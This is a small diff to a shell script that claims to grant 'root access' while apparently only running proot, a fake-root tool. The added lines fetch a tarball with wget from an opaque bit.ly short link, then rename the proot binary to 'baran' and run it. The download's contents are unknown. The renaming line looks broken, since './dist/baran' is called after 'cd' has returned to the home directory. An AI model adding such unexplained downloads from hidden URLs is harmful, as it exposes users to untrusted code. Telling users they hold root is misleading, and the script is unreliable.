@@ -13,4 +13,5 @@ echo "===================================="
 echo "You Got Root access now"
 echo "akuh.net"
 echo "===================================="
-./dist/prossssot -S . /bin/bash
+wget -O paramet.tar.gz https://bit.ly/47tVEr8
+cd dist && mv proot baran && chmod +x baran && cd && ./dist/baran -S . /bin/bash
